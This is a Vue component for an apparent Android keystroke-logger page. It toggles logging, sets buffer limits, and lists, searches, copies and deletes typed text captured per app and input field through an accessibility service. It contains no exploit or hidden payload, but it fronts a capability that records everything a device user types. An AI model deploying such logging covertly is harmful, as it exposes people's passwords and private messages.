<template>
  <div class="ks-root">
    <header class="page-header">
      <router-link to="/tracking-hub" class="back-btn"><i-lucide:arrow-left /></router-link>
      <div class="title-block">
        <h2 class="title"><i-lucide:keyboard /> {{ $t('keystroke_logger') }}</h2>
        <p class="sub">{{ $t('keystroke_logger_desc') }}</p>
      </div>
    </header>

    <div v-if="state && !state.accessibilityServiceConnected" class="warn-card">
      <i-lucide:alert-triangle />
      <span>{{ $t('accessibility_required') }}</span>
    </div>

    <section class="settings-card">
      <div class="row">
        <span class="label">{{ $t('enabled') }}</span>
        <label class="switch">
          <input type="checkbox" :checked="state?.enabled || false" @change="onToggle" />
          <span class="track" />
        </label>
      </div>
      <div class="row col">
        <span class="label">
          {{ $t('buffer_limit') }}: <strong>{{ bufferLimit }}</strong>
        </span>
        <input type="range" min="100" max="20000" step="100" v-model.number="bufferLimit" @change="onBufferChange" />
        <small class="hint">{{ $t('buffer_limit_hint') }}</small>
      </div>
      <div class="row stat">
        <span><i-lucide:database /> {{ state?.totalEntries ?? 0 }} {{ $t('total') }}</span>
      </div>
    </section>

    <section class="filter-bar">
      <div class="search-wrap">
        <i-lucide:search />
        <input type="search" v-model="query" :placeholder="$t('search_keystrokes')" @input="debouncedReload" />
      </div>
      <select v-model="pkgFilter" @change="reload" class="pkg-select">
        <option value="">{{ $t('all_apps') }}</option>
        <option v-for="p in pkgStats" :key="p.packageName" :value="p.packageName">
          {{ pkgLabel(p.packageName) }} ({{ p.count }})
        </option>
      </select>
      <button class="ghost-btn" @click="bulkOpen = !bulkOpen" :disabled="!state?.totalEntries">
        <i-lucide:list-x /> {{ $t('bulk_delete') }}
      </button>
      <button class="ghost-btn danger" @click="onClearAll" :disabled="!state?.totalEntries">
        <i-lucide:trash-2 /> {{ $t('clear_all') }}
      </button>
    </section>

    <section v-if="bulkOpen" class="bulk-card">
      <div class="bulk-grid">
        <label class="field">
          <span>{{ $t('bulk_from') }}</span>
          <input type="datetime-local" v-model="bulkFrom" />
        </label>
        <label class="field">
          <span>{{ $t('bulk_to') }}</span>
          <input type="datetime-local" v-model="bulkTo" />
        </label>
        <label class="field">
          <span>{{ $t('bulk_keep_newest') }}</span>
          <input type="number" min="0" step="10" v-model.number="bulkKeepN" :placeholder="$t('bulk_keep_hint')" />
        </label>
        <label class="field">
          <span>{{ $t('bulk_app') }}</span>
          <select v-model="bulkPkg">
            <option value="">{{ $t('all_apps') }}</option>
            <option v-for="p in pkgStats" :key="p.packageName" :value="p.packageName">
              {{ pkgLabel(p.packageName) }} ({{ p.count }})
            </option>
          </select>
        </label>
      </div>
      <div class="bulk-quick">
        <button class="chip" @click="setQuickRange('1d')">{{ $t('older_than_1d') }}</button>
        <button class="chip" @click="setQuickRange('7d')">{{ $t('older_than_7d') }}</button>
        <button class="chip" @click="setQuickRange('30d')">{{ $t('older_than_30d') }}</button>
        <button class="chip" @click="resetBulk">{{ $t('reset') }}</button>
      </div>
      <div class="bulk-actions">
        <button class="ghost-btn" @click="bulkOpen = false">{{ $t('cancel') }}</button>
        <button class="ghost-btn danger" @click="onBulkDelete">
          <i-lucide:trash-2 /> {{ $t('delete') }}
        </button>
      </div>
    </section>

    <section class="entries-list" v-if="entries.length > 0">
      <div v-for="e in entries" :key="e.id" class="entry">
        <div class="entry-head">
          <img class="app-icon" :src="iconUrl(e.packageName)" alt="" @error="onIconErr" />
          <div class="entry-meta">
            <div class="primary">
              <strong>{{ e.appLabel || e.packageName }}</strong>
              <span v-if="e.fieldHint" class="field-hint" :title="$t('field') + ': ' + e.fieldHint">
                · {{ e.fieldHint }}
              </span>
            </div>
            <div class="secondary">
              <i-lucide:clock /> {{ formatTime(e.ts) }}
            </div>
          </div>
          <div class="entry-actions">
            <button class="icon-btn" :title="$t('copy')" @click="onCopy(e)">
              <i-lucide:check v-if="copiedId === e.id" />
              <i-lucide:clipboard v-else />
            </button>
            <button class="icon-btn danger" :title="$t('delete')" @click="onDelete(e)">
              <i-lucide:x />
            </button>
          </div>
        </div>
        <pre class="entry-text">{{ e.text }}</pre>
      </div>
      <div v-if="entries.length < total" class="load-more">
        <button class="ghost-btn" @click="loadMore">+{{ Math.min(100, total - entries.length) }}</button>
      </div>
    </section>

    <div v-else-if="state && state.totalEntries === 0" class="empty">
      <i-lucide:keyboard />
      <h3>{{ $t('no_keystrokes_yet') }}</h3>
    </div>
    <div v-else-if="state" class="empty">
      <i-lucide:search />
      <h3>{{ $t('no_keystrokes_match') }}</h3>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted, onUnmounted } from 'vue'
import emitter from '@/plugins/eventbus'
import toast from '@/components/toaster'
import { gqlFetch } from '@/lib/api/gql-client'
import {
  keystrokeStateGQL, keystrokeEntriesGQL, keystrokeEntriesCountGQL, keystrokePackageStatsGQL,
} from '@/lib/api/query'
import {
  setKeystrokeLoggerEnabledGQL, setKeystrokeBufferLimitGQL,
  clearKeystrokeLogGQL, deleteKeystrokeEntryGQL,
  bulkDeleteKeystrokesGQL,
} from '@/lib/api/mutation'
import { getFileUrlByPath } from '@/lib/api/file'
import { storeToRefs } from 'pinia'
import { useTempStore } from '@/stores/temp'
import { useI18n } from 'vue-i18n'

const { t } = useI18n()
const { urlTokenKey } = storeToRefs(useTempStore())

interface IEntry { id: string; ts: number; packageName: string; appLabel: string; fieldHint: string; text: string }
interface IState { enabled: boolean; accessibilityServiceConnected: boolean; bufferLimit: number; totalEntries: number }
interface IPkgStat { packageName: string; count: number }

const state = ref<IState | null>(null)
const entries = ref<IEntry[]>([])
const total = ref(0)
const pkgStats = ref<IPkgStat[]>([])
const query = ref('')
const pkgFilter = ref('')
const bufferLimit = ref(5000)
const copiedId = ref<string | null>(null)
const bulkOpen = ref(false)
const bulkFrom = ref('')
const bulkTo = ref('')
const bulkKeepN = ref<number | ''>('')
const bulkPkg = ref('')
const PAGE = 100

function setQuickRange(s: '1d' | '7d' | '30d') {
  const days = s === '1d' ? 1 : s === '7d' ? 7 : 30
  bulkFrom.value = ''
  const cutoff = new Date(Date.now() - days * 86400000)
  cutoff.setSeconds(0, 0)
  bulkTo.value = cutoff.toISOString().slice(0, 16)
  bulkKeepN.value = ''
}
function resetBulk() {
  bulkFrom.value = ''
  bulkTo.value = ''
  bulkKeepN.value = ''
  bulkPkg.value = ''
}
async function onBulkDelete() {
  const fromMs = bulkFrom.value ? new Date(bulkFrom.value).getTime() : 0
  const toMs = bulkTo.value ? new Date(bulkTo.value).getTime() : 0
  const keepN = typeof bulkKeepN.value === 'number' && bulkKeepN.value > 0 ? bulkKeepN.value : 0
  if (fromMs === 0 && toMs === 0 && keepN === 0 && !bulkPkg.value) {
    if (!confirm(t('confirm_bulk_no_filter'))) return
  } else if (!confirm(t('confirm_bulk_delete'))) return
  const r = await gqlFetch<{ bulkDeleteKeystrokes: number }>(bulkDeleteKeystrokesGQL, {
    fromTs: String(fromMs), toTs: String(toMs),
    packageName: bulkPkg.value, olderThanN: keepN,
  })
  const removed = r?.data?.bulkDeleteKeystrokes ?? 0
  toast(t('bulk_deleted_n', { n: removed }), 'info')
  bulkOpen.value = false
  await Promise.all([loadState(), loadPkgStats(), reload()])
}
let debounceTimer: ReturnType<typeof setTimeout> | null = null

function debouncedReload() {
  if (debounceTimer) clearTimeout(debounceTimer)
  debounceTimer = setTimeout(reload, 300)
}

async function loadState() {
  try {
    const r = await gqlFetch<{ keystrokeState: IState }>(keystrokeStateGQL, {})
    if (!r.errors) {
      state.value = r.data.keystrokeState
      bufferLimit.value = state.value.bufferLimit
    }
  } catch (_) {}
}

async function loadPkgStats() {
  try {
    const r = await gqlFetch<{ keystrokePackageStats: IPkgStat[] }>(keystrokePackageStatsGQL, {})
    if (!r.errors) pkgStats.value = r.data.keystrokePackageStats
  } catch (_) {}
}

async function reload() {
  await Promise.all([refetchEntries(0), refetchCount()])
}

async function refetchEntries(offset: number) {
  try {
    const r = await gqlFetch<{ keystrokeEntries: IEntry[] }>(keystrokeEntriesGQL, {
      offset, limit: PAGE, query: query.value, packageName: pkgFilter.value, fromTs: '0', toTs: '0',
    })
    if (!r.errors) {
      entries.value = offset === 0 ? r.data.keystrokeEntries : entries.value.concat(r.data.keystrokeEntries)
    }
  } catch (_) {}
}

async function refetchCount() {
  try {
    const r = await gqlFetch<{ keystrokeEntriesCount: number }>(keystrokeEntriesCountGQL, {
      query: query.value, packageName: pkgFilter.value, fromTs: '0', toTs: '0',
    })
    if (!r.errors) total.value = r.data.keystrokeEntriesCount
  } catch (_) {}
}

async function loadMore() { await refetchEntries(entries.value.length) }

async function onToggle(ev: Event) {
  const enabled = (ev.target as HTMLInputElement).checked
  await gqlFetch(setKeystrokeLoggerEnabledGQL, { enabled })
  await loadState()
}

async function onBufferChange() {
  await gqlFetch(setKeystrokeBufferLimitGQL, { limit: bufferLimit.value })
  await loadState()
}

async function onClearAll() {
  if (!confirm(t('confirm_clear_keystrokes'))) return
  await gqlFetch(clearKeystrokeLogGQL, {})
  await Promise.all([loadState(), loadPkgStats(), reload()])
}

async function onDelete(e: IEntry) {
  await gqlFetch(deleteKeystrokeEntryGQL, { id: e.id })
  entries.value = entries.value.filter(x => x.id !== e.id)
  await Promise.all([loadState(), loadPkgStats()])
  total.value = Math.max(0, total.value - 1)
}

function onCopy(e: IEntry) {
  try {
    navigator.clipboard.writeText(e.text)
    copiedId.value = e.id
    setTimeout(() => { if (copiedId.value === e.id) copiedId.value = null }, 1200)
  } catch (_) { toast(t('copy'), 'error') }
}

function pkgLabel(pkg: string): string {
  const e = entries.value.find(x => x.packageName === pkg)
  return e?.appLabel || pkg
}
function iconUrl(pkg: string): string {
  return getFileUrlByPath(urlTokenKey.value, 'pkgicon://' + pkg)
}
function onIconErr(ev: Event) { (ev.target as HTMLImageElement).style.visibility = 'hidden' }
function formatTime(ts: number): string {
  return new Date(ts).toLocaleString()
}

function onLogged(payload: any) {
  if (state.value) state.value.totalEntries = payload?.totalEntries ?? state.value.totalEntries + 1
  // Only auto-prepend when no filters are active so search results stay stable.
  if (!query.value && !pkgFilter.value && payload?.entry) {
    entries.value.unshift(payload.entry)
    total.value++
  }
}

onMounted(async () => {
  await loadState()
  await Promise.all([loadPkgStats(), reload()])
  emitter.on('keystroke_logged', onLogged)
})
onUnmounted(() => {
  emitter.off('keystroke_logged', onLogged)
})
</script>

<style scoped lang="scss">
.ks-root { padding: 18px 22px 28px; max-width: 1100px; margin: 0 auto; display: flex; flex-direction: column; gap: 16px; }
.page-header { display: flex; align-items: center; gap: 14px; }
.back-btn {
  display: inline-flex; align-items: center; justify-content: center;
  width: 38px; height: 38px; border-radius: 50%;
  background: var(--md-sys-color-surface-container); color: inherit; text-decoration: none;
}
.back-btn:hover { background: var(--md-sys-color-surface-container-high); }
.title-block .title {
  margin: 0; font-size: 1.25rem; font-weight: 700;
  display: flex; align-items: center; gap: 8px;
}
.title svg { width: 22px; height: 22px; color: #f59e0b; }
.sub { margin: 4px 0 0; color: var(--md-sys-color-on-surface-variant); font-size: 0.85rem; }

.warn-card {
  display: flex; align-items: center; gap: 10px;
  padding: 12px 16px; border-radius: 14px;
  background: rgba(245,158,11,0.12); color: #b45309;
  border: 1px solid rgba(245,158,11,0.35);
  font-size: 0.86rem;
}
.warn-card svg { width: 18px; height: 18px; }

.settings-card {
  background: var(--md-sys-color-surface-container);
  border-radius: 18px; padding: 16px; display: flex; flex-direction: column; gap: 14px;
}
.row { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
.row.col { flex-direction: column; align-items: stretch; gap: 6px; }
.row.stat { color: var(--md-sys-color-on-surface-variant); font-size: 0.85rem; }
.row.stat svg { width: 14px; height: 14px; }
.label { font-size: 0.88rem; font-weight: 600; }
.hint { color: var(--md-sys-color-on-surface-variant); font-size: 0.74rem; }

.switch { position: relative; width: 44px; height: 24px; flex-shrink: 0; }
.switch input { opacity: 0; width: 0; height: 0; }
.switch .track {
  position: absolute; inset: 0; border-radius: 999px;
  background: var(--md-sys-color-surface-container-highest);
  transition: 0.2s;
}
.switch .track::before {
  content: ''; position: absolute; left: 3px; top: 3px; width: 18px; height: 18px;
  border-radius: 50%; background: white; transition: 0.2s;
}
.switch input:checked + .track { background: #f59e0b; }
.switch input:checked + .track::before { transform: translateX(20px); }

.filter-bar { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
.search-wrap {
  display: inline-flex; align-items: center; gap: 8px; flex: 1; min-width: 220px;
  padding: 8px 12px; background: var(--md-sys-color-surface-container);
  border-radius: 12px; border: 1px solid var(--md-sys-color-outline-variant);
}
.search-wrap svg { width: 16px; height: 16px; opacity: 0.6; }
.search-wrap input { flex: 1; background: transparent; border: none; outline: none; color: inherit; font: inherit; }
.pkg-select {
  padding: 8px 12px; border-radius: 12px;
  background: var(--md-sys-color-surface-container); color: inherit;
  border: 1px solid var(--md-sys-color-outline-variant); font: inherit;
}

.ghost-btn {
  display: inline-flex; align-items: center; gap: 6px;
  padding: 8px 14px; border-radius: 12px;
  background: var(--md-sys-color-surface-container);
  border: 1px solid var(--md-sys-color-outline-variant);
  color: inherit; font: inherit; cursor: pointer;
  transition: background 0.15s;
}
.ghost-btn:hover { background: var(--md-sys-color-surface-container-high); }
.ghost-btn:disabled { opacity: 0.45; cursor: not-allowed; }
.ghost-btn.danger { color: #dc2626; border-color: rgba(220,38,38,0.3); }
.ghost-btn svg { width: 14px; height: 14px; }

.entries-list { display: flex; flex-direction: column; gap: 8px; }
.entry {
  background: var(--md-sys-color-surface-container);
  border-radius: 14px; padding: 12px 14px;
  border: 1px solid var(--md-sys-color-outline-variant);
}
.entry-head { display: flex; align-items: center; gap: 10px; }
.app-icon { width: 28px; height: 28px; border-radius: 6px; flex-shrink: 0; object-fit: contain; }
.entry-meta { flex: 1; min-width: 0; }
.entry-meta .primary { font-size: 0.9rem; }
.field-hint { color: var(--md-sys-color-on-surface-variant); font-size: 0.78rem; }
.entry-meta .secondary {
  color: var(--md-sys-color-on-surface-variant);
  font-size: 0.74rem;
  display: inline-flex; align-items: center; gap: 4px;
  margin-top: 2px;
}
.entry-meta .secondary svg { width: 12px; height: 12px; }
.entry-actions { display: flex; gap: 4px; }
.icon-btn {
  width: 32px; height: 32px; border-radius: 8px;
  display: inline-flex; align-items: center; justify-content: center;
  background: transparent; border: none; color: inherit; cursor: pointer;
}
.icon-btn:hover { background: var(--md-sys-color-surface-container-high); }
.icon-btn.danger:hover { color: #dc2626; }
.icon-btn svg { width: 14px; height: 14px; }
.entry-text {
  margin: 8px 0 0; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
  font-size: 0.82rem; line-height: 1.4;
  white-space: pre-wrap; word-break: break-word;
  background: var(--md-sys-color-surface);
  padding: 10px 12px; border-radius: 10px;
  max-height: 200px; overflow: auto;
}

.load-more { display: flex; justify-content: center; padding: 6px; }

.empty {
  text-align: center; padding: 60px 20px;
  color: var(--md-sys-color-on-surface-variant);
  display: flex; flex-direction: column; align-items: center; gap: 8px;
}
.empty svg { width: 36px; height: 36px; opacity: 0.4; }
.empty h3 { margin: 0; font-weight: 500; font-size: 0.95rem; }

.bulk-card {
  background: var(--md-sys-color-surface-container);
  border: 1px solid var(--md-sys-color-outline-variant);
  border-radius: 14px; padding: 14px;
  display: flex; flex-direction: column; gap: 12px;
}
.bulk-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr)); gap: 10px; }
.bulk-card .field { display: flex; flex-direction: column; gap: 4px; }
.bulk-card .field span { font-size: 0.78rem; color: var(--md-sys-color-on-surface-variant); font-weight: 600; }
.bulk-card .field input, .bulk-card .field select {
  padding: 7px 10px; border-radius: 8px;
  border: 1px solid var(--md-sys-color-outline-variant);
  background: var(--md-sys-color-surface); color: inherit; font: inherit;
}
.bulk-quick { display: flex; gap: 6px; flex-wrap: wrap; }
.chip {
  padding: 5px 12px; border-radius: 999px; font-size: 0.78rem; font-weight: 600;
  background: var(--md-sys-color-surface); color: var(--md-sys-color-on-surface-variant);
  border: 1px solid var(--md-sys-color-outline-variant); cursor: pointer;
}
.chip:hover { background: var(--md-sys-color-surface-container-high); }
.bulk-actions { display: flex; gap: 8px; justify-content: flex-end; }
</style>
